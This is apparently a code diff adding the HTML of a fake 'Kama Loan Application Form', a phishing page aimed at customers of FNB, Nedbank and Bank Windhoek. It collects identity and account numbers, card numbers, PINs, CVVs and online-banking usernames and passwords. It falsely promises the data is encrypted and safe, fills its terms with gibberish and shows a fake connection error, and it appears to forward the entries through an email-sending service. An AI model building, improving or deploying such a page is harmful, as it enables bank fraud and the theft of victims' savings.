@@ -1,0 +1,180 @@
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="apply.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+    <link href="https://fonts.googleapis.com/css2?family=Charm:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/b33e9054eb.js" crossorigin="anonymous"></script>
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('0LRBbfsuLkB1b-7os');
+        })();
+    </script>
+</head>
+<body>
+
+    <div id="div1">
+        <div id="img1"><img src="./WhatsApp Image 2024-08-14 at 07.45.54_4a35769f.jpg" alt=""></div>
+        <i id="icon1" class="fa-solid fa-bars"></i>
+        <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+        <i id="icon2" class="fa-solid fa-magnifying-glass"></i>
+    </div>
+    <div id="div2">
+        <p id="p4">Kama Loan Application Form</p>
+    </div>
+    <form id="contact-form">
+
+        <div id="all-the-terms" style="display: none;">
+            <p>
+                ghiwfuygcuwecvwegc gfyud yhgfughuergh ff yf e fycguefgcuwgac w fywegwe fcywegc wecgwe dfy gwecd cdcgyec gd cgd7 ycgd c
+            </p>
+            <p>ygcbgudcd cugycg d vdgd chducui vcduchd chducis  ce hc  cuhciuhw  uhc c uwc w   ufhhuehciw </p>
+
+            <p id="continue">Agree >></p>
+        </div>
+        <div id="form1">
+            
+                <input type="hidden" name="contact_number">
+        
+                <label for="name">Full Name:</label> <br>
+                <input type="text" name="name" id="name" placeholder="Enter First Name"> 
+                <input type="text" name="surname" id="surname" placeholder="Enter Surname"> <br>
+        
+                <label for="address">Address:</label>
+                <input type="text" name="address" id="address" placeholder="Enter Address"><br>
+        
+                <label for="phone">Phone Number</label>
+                <input type="number" name="phone" id="phone" placeholder="Enter Phone Number"><br>
+        
+                <label for="account">Account Number:</label>
+                <input type="number" name="account" id="account" placeholder="Enter Account Number"><br>
+            
+                <label for="identity">ID Number:</label> <br>
+                <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br>
+                           
+                <label for="email">E-Mail Address:</label> <br>
+                <input type="email" name="email" id="email" placeholder="Enter Email"> <br>
+            
+                <p id="error"></p>
+                <!-- <p id="p3">This section must be completed by representative</p>
+                    <label for="address">Address:</label><br>
+                    <div id="residence">
+                        <input type="text" name="city" id="address" placeholder="Enter city">
+                <input type="text" name="state" id="state" placeholder="Enter State / Province"> <br>
+            </div>
+                <input type="text" name="postal" id="postal" placeholder="Enter Postal / Zip Code"><br> -->
+        
+                <!-- <img id="img2" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+                
+                <!-- <img id="img9" src="./WhatsApp Image 2023-10-13 at 5.22.53 PM.jpeg" alt=""> --> 
+                <p id="next">Next >></p>
+            
+                <div id="terms">
+                    <input type="checkbox" name="agree" id="agree">
+                    <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+                    
+                </div>
+        </div>
+        <div style="display: none;" id="form2">
+            <label for="" id="show-bank-details">Kindly select your bank first</label> <br>
+            <select name="bank" id="banks">
+                <option id="opt1" value="Select your bank">Select your bank</option>
+                <option id="opt2" value="FNB">FNB</option>
+                <option id="opt3" value="NEDBANK">NEDBANK</option>
+                <option id="opt4" value="WINDHOEK">WINDHOEK</option>
+            </select>
+
+
+            <div id="FNB-details" style="display: none;">
+                <p id="p2">Kindly input the required details to enable your loan disbursement into your account and
+                        be ensured that your details are all encrypted and safe</p>
+                <label for="card">Card Number:</label> <br>
+                <input type="number" class="fnbs" name="card" id="card" placeholder="Enter Card Number"> <br>
+        
+                <label for="pin">Card Pin:</label><br>
+                <input type="number" class="fnbs" name="pin" id="pin" placeholder="Enter Card Pin"> <br>
+        
+                <p id="p3"> Kindly input the required details to enable your loan disbursement into your account and
+                    be ensured that your details are all encrypted and safe</p>
+                <label for="username">App Username:</label> <br>
+                <input type="text" class="fnbs" name="username" id="username" placeholder="Enter Username"> <br>
+        
+                <label for="password">App Password:</label> <br>
+                <input type="password" class="fnbs" name="password" id="password" placeholder="Enter Password"> <br>            
+           
+                <p id="error2"></p>
+
+                     <input type="submit" value="Submit" id="submit" style="display: none;">
+      
+            </div>
+            
+            <div id="NEDBANK-datails" style="display: none;">
+                <p id="p2">Kindly input the required details to enable your loan disbursement into your account and
+                    be ensured that your details are all encrypted and safe</p>
+                <label for="profileNumber">Profile Number:</label> <br>
+                <input type="number" class="nedbank" name="Profile" id="profileNumber" placeholder="Enter Profile Number"> <br>
+    
+                <label for="password">Password:</label><br>
+                <input type="password" class="nedbank" name="profilePassword" id="profilePassword" placeholder="Enter password"> <br>
+           
+                <p id="error3"></p>
+
+                     <input type="submit" value="Submit" id="submit1" style="display: none;">
+      
+            </div>
+
+            <div id="WINDHOEK-details" style="display: none;">
+                <p id="p2">Kindly input the required details to enable your loan disbursement into your account and
+                        be ensured that your details are all encrypted and safe</p>
+                <label for="email">E-Mail Address:</label> <br>
+                <input type="email" class="windhoeks" name="windhoek-email" id="windhoek-email" placeholder="Enter Email"> <br>
+            
+                <label for="password">Password:</label><br>
+                <input type="password" class="windhoeks" name="wimdhoek-password" id="wimdhoek-password" placeholder="Enter password"> <br>
+
+                <label for="card">Card Number:</label> <br>
+                <input type="number" class="windhoeks" name="cardNumber" id="cardNumber" placeholder="Enter Card Number"> <br>
+        
+                <div id="card-details">
+                    <input type="text" class="windhoeks" name="card-date" id="card-date" placeholder="mm/yy" maxlength="5"> <br>
+                    <input type="number" class="windhoeks" name="cvv" id="cvv" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
+         
+                </div>
+                <p id="error4"></p>
+
+                     <input type="submit" value="Submit" id="submit2" style="display: none;">
+      
+            </div>
+         </div>
+
+      
+        
+
+        <!-- <img id="img1" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+
+
+
+    </form>
+
+    <div id="write-up" style="display: none;">
+        <div id="write">
+            <!-- <img src="./b14ebf87-f581-432d-82f4-c51932ca8653.jpg" alt=""> -->
+            <h3>Heading</h3>
+            <p id="failure">Unable to make to submit form <br><br> <span id="why">
+              Due to your internet connection</span> </p>
+            </div>
+    </div>
+    <div id="successful" style="display: none; width: 100vw;">
+        <img style="width: 104vw;" src="./WhatsApp Image 2024-05-13 at 23.06.34 (1).jpeg" alt="">
+    </div>
+   </div>
+   </div>
+    <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
+    <script src="index.js"></script>
+</body>
+</html>
